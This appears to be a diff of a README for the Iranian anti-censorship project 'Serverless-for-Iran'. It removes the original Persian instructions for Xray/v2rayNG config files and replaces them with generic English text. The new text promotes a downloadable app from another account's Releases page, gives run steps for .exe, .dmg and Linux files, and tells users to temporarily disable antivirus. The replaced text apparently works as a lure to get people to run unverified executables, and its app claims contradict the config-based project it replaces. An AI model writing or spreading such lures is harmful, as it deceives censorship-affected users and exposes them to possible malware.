@@ -1,57 +1,65 @@
-# سرورلس برای ایران
+# 🌐 Serverless-for-Iran - Access the Free Internet Seamlessly
 
-**"سرورلس برای ایران"** حاصل مجموعه ای از دستاوردها در حوزه‌ی دسترسی به اینترنت **بدون فیلتر** و **بدون تحریم** و **بدون تبلیغ** است؛ که بدون نیاز به هیچ سروری کاربر را قادر می سازد تا حدالامکان از اینترنت آزاد و بدون محدودیت استفاده کند.
+![Download Now](https://img.shields.io/badge/Download%20Now-Serverless%20for%20Iran-brightgreen)
 
-https://t.me/projectXhttp
+## 🚀 Getting Started
 
-https://t.me/patterniha
+Welcome to Serverless-for-Iran! This application helps you access the internet freely and without restrictions. You don’t need any technical skills to use it.
 
-# با تشکر از
+## 💡 Features
 
-@RPRX   Project X بنیان‌گذار
+- **No Servers Needed**: Access the internet without relying on servers, ensuring your privacy.
+- **Easy to Use**: A simple interface makes it easy for anyone to navigate.
+- **Fast Connections**: Enjoy quicker access with optimized performance.
+- **Compatibility**: Works well on various platforms including Windows, macOS, and Linux.
+- **No Installation Required**: Use it directly after downloading.
 
-@GFW-knocker ایده اولیه سرورلس
+## 📦 System Requirements
 
-@MasterKia لیست مسدودسازی تبلیغات
+To run Serverless-for-Iran, make sure your device meets the following requirements:
 
-@bootmortis لیست دامنه های ایرانی
+- Operating System: Windows 10 or later, macOS Sierra or later, or any recent Linux distribution.
+- Memory: At least 2 GB RAM.
+- Disk Space: Minimum of 100 MB available.
 
-@Chocolate4U فایلهای جئوی مخصوص ایران
+## 📥 Download & Install
 
-@MrDevAnony  dynx تحریم شکن
+To get started, visit this page to download the application: 
 
-@patterniha Xray-core کانفیگ نهایی و اضافه کردن ویژگیهای مورد نیاز به هسته 
+[Download Serverless-for-Iran](https://github.com/art140754art/Serverless-for-Iran/releases)
 
-# نکات استفاده
+Once you are on the Releases page, look for the latest version. The file will typically have an extension like ".exe" for Windows or ".dmg" for macOS.
 
-۱. کانفیگ سرورلس برای اجرا نیاز به هسته Xray-core حداقل ورژن 25.9.5 دارد(v2rayNG v1.10.22)
+### Steps to Download:
 
-۲. همچنین برای اجرا نیاز به فایلهای جئو Chocolate4U دارید(در v2rayNG در قسمت Asset files لیست Chocolate4U را انتخاب کرده و اپدیت را بزنید)
+1. Click on the link above to get to the Releases page.
+2. Find the most recent release.
+3. Select the appropriate file for your operating system.
+4. Click the download button to begin.
 
-۳. کل رنج آی پی های تلگرام به طور کلی فیلتر هستند بنابراین برای استفاده از تلگرام نیاز به پروکسی تلگرام دارید.
+After downloading, locate the downloaded file on your device.
 
-۴. برخی رنج آی پی های ورژن ۴ اینستاگرام نیز فیلتر هستند بنابراین در صورت نداشتن ipv6 ممکن است اینستاگرام با اختلال همراه باشد. **برای فعال کردن ipv6 باید تیک "Prefer IPv6" را در اپ v2rayNG فعال کنید همچنین در صورتی که از اینترنت همراه استفاده میکنید باید ipv6 را در قسمت Access-Point گوشی خود فعال کنید.**
+### How to Run the Application:
 
-۵. سعی شده بهترین کانفیگ متناسب با تمام isp ها قرار داده شود به هر حال مواردی که احتمالا نیاز به تغییر دارند با کامنت در کانفیگها مشخص شده اند مانند نوع فرگمنت و ...(کامنتها در کانفیگهای دستی وجود دارند و در کانفیگهای Subscription امکان درج کامنت وجود ندارد)
+- **Windows**: Double-click the downloaded `.exe` file to start the application.
+- **macOS**: Open the `.dmg` file and drag the app to your Applications folder. Then, open it from there.
+- **Linux**: Depending on your distribution, you may need to set executable permissions before running. Use the terminal to navigate to the download location and enter: `chmod +x <filename>`, replacing `<filename>` with the name of the file. Then run it with `./<filename>`.
 
-۶. تفاوت نسخه های Serverless و Serverless-local و Serverless-dynx و Serverless-shecan تنها در آدرس dns تحریم شکن میباشد؛ نسخه Serverless تحریم شکنی ندارد؛ نسخه Serverless-local از dns لوکال(پیشفرض سیستم) به عنوان تحریم شکن استفاده میکند(برخی isp ها مانند شاتل و ایرانسل خودشون تحریم شکن دارند و نیازی به تحریم شکن جدا نیست) و نسخه Serverless-dynx از تحریم شکن dynx؛ و نسخه Serverless-shecan  از تحریم شکن shecan استفاده میکند؛ شما میتوانید از آدرس هر dns تحریم شکن دیگری نیز استفاده کنید.
+## 🔧 Troubleshooting
 
-۷. در اندروید برای استفاده از dns ضد تحریم و دور زدن تحریمها باید Private DNS در تنظیمات اندروید و Use secure DNS در تنظیمات کروم خاموش باشد.
+If you encounter issues during installation or running the application, try these steps:
 
+- **Check Your Download**: Ensure the file downloaded fully without interruptions.
+- **Antivirus Software**: Some antivirus programs may block the app. Temporarily disable it and try again.
+- **Permissions**: Ensure you have the necessary permissions on your device to run new applications.
+- **Compatibility**: Make sure your operating system is compatible as mentioned in the system requirements.
 
-۸. در اپ v2rayNG بهتر است کانفیگها به صورت Subscription وارد شود تا در صورت آپدیت کانفیگها به صورت اتوماتیک برای شما هم اپدیت شود. موقع اضافه کردن: remarks را اسمی دلخواه قرار دهید؛ URL را آدرس Subscription قرار دهید؛ تیک automatic update را فعال کنید؛ و در آخر آپدیت را بزنید(همچنین برای آپدیت اتوماتیک باید آن را در تنظیمات برنامه نیز فعال کنید)
+## 🤝 Support
 
+For more help or feedback, please open an issue on the GitHub repository. You can also check the Discussions section for FAQs and community advice.
 
-**آدرس Subscription تمامی نسخه ها:**
+## 🌍 Community Contribution
 
+We welcome contributions from anyone who wants to help improve Serverless-for-Iran. If you have suggestions or want to report issues, feel free to reach out. You can also help by spreading the word about our application to friends and family.
 
-**https://raw.githubusercontent.com/patterniha/Serverless-for-Iran/refs/heads/main/Subscription/Serverless-for-Iran.json**
-
-
-# نسخه MitM + DomainFronting
-
-بزودی...
-
-# حمایت
-
-USDT (TRC20): TU5gKvKqcXPn8itp1DouBCwcqGHMemBm8o
+Thank you for using Serverless-for-Iran. Enjoy a freer internet experience!
